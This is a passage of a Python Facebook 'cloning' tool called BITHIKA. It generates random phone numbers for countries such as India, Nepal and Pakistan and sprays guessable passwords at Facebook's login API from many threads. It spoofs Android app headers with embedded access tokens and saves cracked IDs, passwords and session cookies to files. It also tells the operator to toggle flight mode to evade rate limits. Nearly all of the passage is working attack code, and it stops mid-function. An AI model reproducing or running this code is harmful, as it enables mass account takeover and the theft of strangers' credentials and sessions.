                                print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                                print(f'\033[1;32m[\033[1;31m✓\033[1;32m] THE PROCESS HAS COMPLETED')
                                print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL OK/CP : '+str(len(oks))+'/'+str(len(cps)))
                                print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                                input(f'\033[1;32m[\033[1;31m✓\033[1;32m] PRESS ENTER TO BACK ')
                                menu()
                        elif xd in ['2','02']:
                                randm()
                        elif xd in ['3','03']:
                                os.system('xdg-open https://wa.me/+918389066877');menu()
                        elif xd in ['0','05']:
                                exit(f'\033[1;32m[\033[1;31m✓\033[1;32m] BYE BYE ')
                        else:
                                exit(f'\033[1;32m[\033[1;31m✓\033[1;32m] OPTION NOT FOUND IN MENU...')
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
                print(f'\033[1;32m[\033[1;31m✓\033[1;32m] NO INTERNET CONNECTION...')
                exit()
#__________________| RANDOM |__________________#
def randm():
    clear()
    print(f'{G}[{A}1{G}]{G} INDIA CLONING ')
    print(f'{G}[{A}2{G}]{G} INDIA CLONING (full number) ')
    print(f'{G}[{A}3{G}]{G} NEPAL CLONING ')
    print(f'{G}[{A}4{G}]{G} PAKISTAN CLONING ')
    print(f'{G}[{A}5{G}]{G} BANGLADESH CLONING ')
    print(f'{G}[{A}6{G}]{G} NIGERIA CLONING ')
    print(f'{G}[{A}0{G}]{G} BACK TO MENU ');linex()
    option=input(f'{G}[{A}?{G}]{G} CHOICE : ')
    if option in ['1','A']:
        bd()
    elif option in ['2','B']:
    	india()
    elif option in ['3','C']:
    	nepal()
    elif option in ['4','D']:
    	pakistan()
    elif option in ['5','E']:
    	afghanistan()
    elif option in ['6','F']:
    	malaysia()
    elif option in ['0','00']:
    	menu()
    else:
        exit(f'\033[1;32m[\033[1;31m✓\033[1;32m] BYE BYE ')
#__________________| BANGLADESH |__________________#
def bd():
		user=[]
		clear()
		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : 9815 | 9814 | 9861 | 9840 ');linex()
		code = input(f'{G}[{A}?{G}]{G} CHOICE  : ')
		clear();print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : 3000 | 5000 | 10000 | 99999 ');linex()
		limit = int(input(f'{G}[{A}?{G}]{G} CHOICE  : '))
		clear()
		print(f'{G}[{A}1{G}]{G} METHOD {G}[{A}M1{G}]{G} \n{G}[{A}2{G}]{G} METHOD {G}[{A}M2{G}]{G}\n{G}[{A}3{G}]{G} METHOD {G}[{A}M3{G}]{G}\n{G}[{A}4{G}]{G} METHOD {G}[{A}M4{G}]{G}\n{G}[{A}5{G}]{G} METHOD {G}[{A}M5{G}]{G} ');linex()
		mthd = input(f'{G}[{A}?{G}]{G} CHOICE  : ')
		for nmbr in range(limit):
			nmp=''.join(random.choice(string.digits) for _ in range(6))
			user.append(nmp)
		with tred(max_workers=35) as habib:	
			clear()
			tl = str(len(user))
			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] SIM CODE :{A} {code} ')
			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL ID :{A} {tl} ')
			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] PLEASE EVERY 5 MIN [ON/OF] YOUR FLIGHT MODE');linex()
			for psx in user:
				uid = code+psx
				passlist = [uid[:6],uid[:8],uid,'57273200']
				if mthd in ['1','01']:
					habib.submit(rndm1,uid,passlist)
				if mthd in ['2','02']:
					habib.submit(rndm2,uid,passlist)
				if mthd in ['3','03']:
					habib.submit(rndm3,uid,passlist)
				if mthd in ['4','04']:
					habib.submit(rndm4,uid,passlist)
				if mthd in ['5','05']:
					habib.submit(rndm5,uid,passlist)
		print('\033[1;37m')
		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] THE PROCESS HAS COMPLETED')
		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL OK ID : '+str(len(oks)))
		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL CP ID : '+str(len(cps)))
		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		input(f'\033[1;32m[\033[1;31m✓\033[1;32m] PRESS ENTER TO BACK ')
		menu()
#__________________| INDIA |__________________#
def india():
    clear()
    print(f"\033[1;32m[\033[1;31m✓\033[1;32m] ENTER FULL NUMBER ")
    print(f"\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE - {green}9636543455 ")
    linex()
    number = input(f"\033[1;32m[\033[1;31m✓\033[1;32m] ENTER NUMBER : {green}")
    clear();print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : 50000 | 99999 ');linex()
    limit = int(input(f"\033[1;32m[\033[1;31m✓\033[1;32m] ENTER LIMIT  : {green}"))
    code = number[:4]
    for _ in range(limit):
        total = len(number)
        digits = str(total-4)
        xnxxx = "".join(random.choice(string.digits) for _ in range(int(digits)))
        xnxx.append(xnxxx)
    clear()
    print(f"\033[1;32m[\033[1;31m✓\033[1;32m] HOW MANY PASS USE ?")
    pw_limit = int(input(f"\033[1;32m[\033[1;31m✓\033[1;32m] ENTER PASSWORD LIMIT : {green}"))
    clear()
    print(f"\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : {green}first6-last6 ")
    print(f"\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : {green}first7-last7 ")
    print(f"\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : {green}57273200-59039200 ")
    print(f"\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : {green}fullnumber ")
    linex()
    for p in range(pw_limit):
        p_ask = input(f"\033[1;32m[\033[1;31m{p+1}\033[1;32m] ENTER PASSWORD : {green}")
        pwx.append(p_ask)
    with tpe(max_workers=55) as Xnxx:
        clear()
        tl = str(len(xnxx))
        print(f"\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL IDS  : {green}{tl} ")
        print(f"\033[1;32m[\033[1;31m✓\033[1;32m] SELECTED NUMBER : {green}{number} ")
        print(f"\033[1;32m[\033[1;31m✓\033[1;32m] {green} GET UP SPEED [ON/OF] YOUR FLIGHT MODE")
        linex()
        for user in xnxx:
            uid = code+user
            Xnxx.submit(cracker, uid, pwx, tl)
    linex()
    print(f"\033[1;32m[\033[1;31m✓\033[1;32m] {green}PROCESS COMPLETED ")
    print(f"\033[1;32m[\033[1;31m✓\033[1;32m] {green}TOTAL OK : {str(len(oks))} ")
    linex()
    menu()
#__________________| NEPAL |__________________#
def nepal():
		user=[]
		clear()
		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : 9815 | 9814 | 9861 | 9840 ');linex()
		code = input(f'{G}[{A}?{G}]{G} CHOICE  : ')
		clear();print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : 3000 | 5000 | 10000 | 99999 ');linex()
		limit = int(input(f'{G}[{A}?{G}]{G} CHOICE  : '))
		clear()
		print(f'{G}[{A}1{G}]{G} METHOD {G}[{A}M1{G}]{G} \n{G}[{A}2{G}]{G} METHOD {G}[{A}M2{G}]{G}\n{G}[{A}3{G}]{G} METHOD {G}[{A}M3{G}]{G}\n{G}[{A}4{G}]{G} METHOD {G}[{A}M4{G}]{G} ');linex()
		mthd = input(f'{G}[{A}?{G}]{G} CHOICE  : ')
		for nmbr in range(limit):
			nmp = "". join(random.choice(string.digits) for _ in range(6))
			user.append(nmp)
		with tred(max_workers=30) as habib:	
			clear()
			tl = str(len(user))
			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] SIM CODE :{A} {code} ')
			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL ID :{A} {tl} ')
			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] PLEASE EVERY 5 MIN [ON/OF] YOUR FLIGHT MODE');linex()
			for psx in user:
				uid = code+psx
				passlist = [uid,psx,uid[:8],uid[:7],uid[:6],'nepal123','kathmandu','tamang','maya','magar','magar123','pokhara','pokhara123','tamang123','maya123']
				if mthd in ['1','01']:
					habib.submit(rndm1,uid,passlist)
				if mthd in ['2','02']:
					habib.submit(rndm2,uid,passlist)
				if mthd in ['3','03']:
					habib.submit(rndm3,uid,passlist)
				if mthd in ['4','04']:
					habib.submit(rndm4,uid,passlist)
		print('\033[1;37m')
		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] THE PROCESS HAS COMPLETED')
		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL OK ID : '+str(len(oks)))
		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL CP ID : '+str(len(cps)))
		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		input(f'\033[1;32m[\033[1;31m✓\033[1;32m] PRESS ENTER TO BACK ')
		menu()
		
#__________________| PAKISTAN |__________________#
def pakistan():
		user=[]
		clear()
		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : 0306 | 0335 | 0315 | 0345 ');linex()
		code = input(f'{G}[{A}?{G}]{G} CHOICE  : ')
		clear();print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : 3000 | 5000 | 10000 | 99999 ');linex()
		limit = int(input(f'{G}[{A}?{G}]{G} CHOICE  : '))
		clear()
		print(f'{G}[{A}1{G}]{G} METHOD {G}[{A}M1{G}]{G} \n{G}[{A}2{G}]{G} METHOD {G}[{A}M2{G}]{G}\n{G}[{A}3{G}]{G} METHOD {G}[{A}M3{G}]{G}\n{G}[{A}4{G}]{G} METHOD {G}[{A}M4{G}]{G} ');linex()
		mthd = input(f'{G}[{A}?{G}]{G} CHOICE  : ')
		for nmbr in range(limit):
			nmp = "". join(random.choice(string.digits) for _ in range(7))
			user.append(nmp)
		with tred(max_workers=30) as habib:	
			clear()
			tl = str(len(user))
			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] SIM CODE :{A} {code} ')
			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL ID :{A} {tl} ')
			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] PLEASE EVERY 5 MIN [ON/OF] YOUR FLIGHT MODE');linex()
			for psx in user:
				uid = code+psx
				passlist = [psx,uid,'khankhan','khan1122','ali12345','khanbaba','pakistan','khan12345','ali1122','khankhan12345','khan','baloch','pubg','pubg1122']
				if mthd in ['1','01']:
					habib.submit(rndm1,uid,passlist)
				if mthd in ['2','02']:
					habib.submit(rndm2,uid,passlist)
				if mthd in ['3','03']:
					habib.submit(rndm3,uid,passlist)
				if mthd in ['4','04']:
					habib.submit(rndm4,uid,passlist)
		print('\033[1;37m')
		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] THE PROCESS HAS COMPLETED')
		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL OK ID : '+str(len(oks)))
		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL CP ID : '+str(len(cps)))
		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		input(f'\033[1;32m[\033[1;31m✓\033[1;32m] PRESS ENTER TO BACK ')
		menu()
#__________________| AFGHANISTAN |__________________#
def afghanistan():
		user=[]
		clear()
		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : 017 | 019 | 018 | 016 ');linex()
		code = input(f'{G}[{A}?{G}]{G} CHOICE  : ')
		clear();print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : 3000 | 5000 | 10000 | 99999 ');linex()
		limit = int(input(f'{G}[{A}?{G}]{G} CHOICE  : '))
		clear()
		print(f'{G}[{A}1{G}]{G} METHOD {G}[{A}M1{G}]{G} \n{G}[{A}2{G}]{G} METHOD {G}[{A}M2{G}]{G}\n{G}[{A}3{G}]{G} METHOD {G}[{A}M3{G}]{G}\n{G}[{A}4{G}]{G} METHOD {G}[{A}M4{G}]{G} ');linex()
		mthd = input(f'{G}[{A}?{G}]{G} CHOICE  : ')
		for nmbr in range(limit):
			nmp=''.join(random.choice(string.digits) for _ in range(8))
			user.append(nmp)
		with tred(max_workers=30) as habib:	
			clear()
			tl = str(len(user))
			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] SIM CODE :{A} {code} ')
			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL ID :{A} {tl} ')
			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] PLEASE EVERY 5 MIN [ON/OF] YOUR FLIGHT MODE');linex()
			for psx in user:
				uid = code+psx
				passlist = [psx,uid,'Bangladesh','bangladesh','i love you','iloveyou','free fire','freefire']
				if mthd in ['1','01']:
					habib.submit(rndm1,uid,passlist)
				if mthd in ['2','02']:
					habib.submit(rndm2,uid,passlist)
				if mthd in ['3','03']:
					habib.submit(rndm3,uid,passlist)
				if mthd in ['4','04']:
					habib.submit(rndm4,uid,passlist)
		print('\033[1;37m')
		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] THE PROCESS HAS COMPLETED')
		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL OK ID : '+str(len(oks)))
		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL CP ID : '+str(len(cps)))
		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		input(f'\033[1;32m[\033[1;31m✓\033[1;32m] PRESS ENTER TO BACK ')
		menu()
#__________________| malaysia |__________________#
def malaysia():
		user=[]
		clear()
		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : 011');linex()
		code = input(f'{G}[{A}?{G}]{G} CHOICE  : ')
		clear();print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : 3000 | 5000 | 10000 | 99999 ');linex()
		limit = int(input(f'{G}[{A}?{G}]{G} CHOICE  : '))
		clear()
		print(f'{G}[{A}1{G}]{G} METHOD {G}[{A}M1{G}]{G} \n{G}[{A}2{G}]{G} METHOD {G}[{A}M2{G}]{G}\n{G}[{A}3{G}]{G} METHOD {G}[{A}M3{G}]{G}\n{G}[{A}4{G}]{G} METHOD {G}[{A}M4{G}]{G} ');linex()
		mthd = input(f'{G}[{A}?{G}]{G} CHOICE  : ')
		for nmbr in range(limit):
			nmp = "". join(random.choice(string.digits) for _ in range(8))
			user.append(nmp)
		with tred(max_workers=30) as habib:	
			clear()
			tl = str(len(user))
			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] SIM CODE :{A} {code} ')
			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL ID :{A} {tl} ')
			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] PLEASE EVERY 5 MIN [ON/OF] YOUR FLIGHT MODE');linex()
			for psx in user:
				uid = code+psx
				passlist = [uid,psx,uid[:8],uid[:7],uid[:6],'malaysia','Malaysia']
				if mthd in ['1','01']:
					habib.submit(rndm1,uid,passlist)
				if mthd in ['2','02']:
					habib.submit(rndm2,uid,passlist)
				if mthd in ['3','03']:
					habib.submit(rndm3,uid,passlist)
				if mthd in ['4','04']:
					habib.submit(rndm4,uid,passlist)
		print('\033[1;37m')
		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] THE PROCESS HAS COMPLETED')
		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL OK ID : '+str(len(oks)))
		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL CP ID : '+str(len(cps)))
		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		input(f'\033[1;32m[\033[1;31m✓\033[1;32m] PRESS ENTER TO BACK ')
		menu()


#__________________| FILE METHOD M1 |__________________#
def api1(ids,names,passlist):
        try:
                global oks,cps,loop
                sys.stdout.write(f'\r\r{G}[{R}BITHIKA-M1{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua = '[FBAN/FB4A;FBAV/'+str(random.randint(111,999))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/287.1.0.51.119;FBBV/245251828;FBDM/{density=3'+'.0,width='+'1080,height='+'1920};FBLC/hi_ID;FBRV/248611694;FBCR/Telkomsel;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-C900Y;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        apk = ['438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28', '350685531728|62f8ce9f74b12f84c123cc23437a4a32', '6628568379|c1e620fa708a1d5696fb991c1bde5662', '1479723375646806|afb3e4a6d8b868314cc843c21eebc6ae', '1348564698517390|007c0a9101b9e1c8ffab727666805038']
                        app = random.choice(apk)
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        quality = random.choice(['POOR', 'MODERATE', 'GOOD', 'EXCELLENT'])
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(string.digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": ids,
"password": pas,
"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "NO_FILE",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_GB",
"client_country_code": "GB",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                        #content_lenght = ("&").join([ "%s=%s" % (key, value) for key, value in data.items() ])
                        headers={'User-Agent': ua,
'Accept-Encoding': 'gzip, deflate',
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32',
'Connection': 'Keep-Alive',}
                        url = 'https://graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r{G}[{G}BITHIKA-OK{G}]{G} '+ids+f' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r{G}[{G}COOKIE{G}]>{A} "+coki)
                                        open('/sdcard/BITHIKA-FILE-M1-OK.txt', 'a').write(ids+' | '+pas+' |-> '+coki+"\n")
                                        oks.append(ids)
                                        cek_apk(session, coki)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{G}[{Y}BITHIKA-CP{G}]{Y} '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/BITHIKA-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                break
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass
                
            
#__________________| FILE METHOD M2 |__________________#
def api2(ids,names,passlist):
        try:
                global oks,cps,loop
                sys.stdout.write(f'\r\r{G}[{R}BITHIKA-M2{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua = '[FBAN/FB4A;FBAV/'+str(random.randint(111,999))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/379.0.0.15.109;FBBV/315813473;FBDM/{density=3'+'.0,width='+'1080,height='+'2408};FBLC/en_US;FBRV/316211536;FB_FW/2;FBCR/Telenor;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-M336K;FBSV/12;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(string.digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {'adid' : str(uuid.uuid4()),
'format' : 'json',
'device_id' : str(uuid.uuid4()),
'email' : ids,
'password' : pas,
'generate_analytics_claim' : '1',
'community_id' : '',
'linked_guest_account_userid' :'',
'cpl' : 'true',
'try_num' : '1',
'family_device_id' : str(uuid.uuid4()),
'secure_family_device_id' : str(uuid.uuid4()),
'sim_serials' : ["00920088911210748054"],
'credentials_type' : 'password',
'fb4a_shared_phone_cpl_experiment' : 'fb4a_shared_phone_nonce_cpl_at_risk_v3',
'fb4a_shared_phone_cpl_group' : 'enable_v3_at_risk',
'enroll_misauth' : 'false',
'generate_session_cookies' : '1',
'error_detail_type' : 'button_with_disabled',
'source' : 'login',
'generate_machine_id' : '1',
'jazoest' : '22377',
'meta_inf_fbmeta' : 'V2_UNTAGGED',
'advertiser_id' : str(uuid.uuid4()),
'encrypted_msisdn': '',
'currently_logged_in_userid' : '0',
'locale' : 'en_GB',
'client_country_code' : 'GB',
'fb_api_req_friendly_name' : 'authenticate',
'fb_api_caller_class' : 'Fb4aAuthHandler',
'api_key' : '882a8490361da98702bf97a021ddc14d',
'sig' : 'e5abae6d6564813bfadc6dcd42256834',
'access_token' : '350685531728|62f8ce9f74b12f84c123cc23437a4a32' }
                        headers = {"User-Agent":ua,
"Accept-Encoding":"gzip, deflate",
"Connection":"keep-alive",
"Content-Type":"application/x-www-form-urlencoded",
"Host":"graph.facebook.com",
"X-FB-Net-HNI":str(random.randint(3e7,4e7)),
"X-FB-SIM-HNI":str(random.randint(2e4,4e4)),
"X-FB-Connection-Type":"MOBILE.LTE",
"Authorization":"OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895",
"X-FB-Connection-Quality":"MOBILE.LTE",
"X-FB-Connection-Bandwidth":str(random.randint(3e7,4e7)),
"X-Tigon-Is-Retry":"False",
"X-FB-Friendly-Name":"ViewerReactionsMutation",
"X-FB-Request-Analytics-Tags":"graphservice",
"X-FB-HTTP-Engine":"Liger",
"X-FB-Client-IP":"True",
"X-FB-Server-Cluster":"True",
"x-fb-connection-token":"d29d67d37eca387482a8a5b740f84f62"}

                        url = 'https://graph.facebook.com/method/auth.login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r{G}[{G}BITHIKA-OK{G}]{G} '+ids+f' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r{G}[{G}COOKIE{G}]>{A} "+coki)
                                        cek_apk(session, coki)
                                        open('/sdcard/BITHIKA-FILE-M2-OK.txt', 'a').write(ids+' | '+pas+' |-> '+coki+"\n")
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{G}[{Y}BITHIKA-CP{G}]{Y} '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/BITHIKA-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                break
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass
  

#__________________| FILE METHOD M3 |__________________#     
def api3(ids,names,passlist):
        try:
                global loop,oks,cps
                sys.stdout.write(f'\r\r{G}[{R}BITHIKA-M3{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua = 'Dalvik/1.6.0 (Linux; U; Android 11; SM-A310N0 Build/MMB29K) [FBAN/FB4A;FBAV/310.0.0.50.118;FBBV/282018885;FBDM/{density=2'+'.0,width='+'720,height='+'1280};FBLC/it_IT;FBRV/282418117;FBCR/Vodafone;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A310N0;FBSV/11;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(string.digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {'adid': str(uuid.uuid4()),
'format': 'json',
'device_id': str(uuid.uuid4()),
'email': ids,
'password': pas,
'generate_analytics_claims': '1',
'community_id': '',
'cpl': 'true',
'try_num': '1',
'family_device_id': str(uuid.uuid4()),
'credentials_type': 'password',
'source': 'login',
'error_detail_type': 'button_with_disabled',
'enroll_misauth': 'false',
'generate_session_cookies': '1',
'generate_machine_id': '1',
'currently_logged_in_userid': '0',
'locale': 'it_IT',
'client_country_code': 'IT',
'fb_api_req_friendly_name': 'authenticate',
'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'}

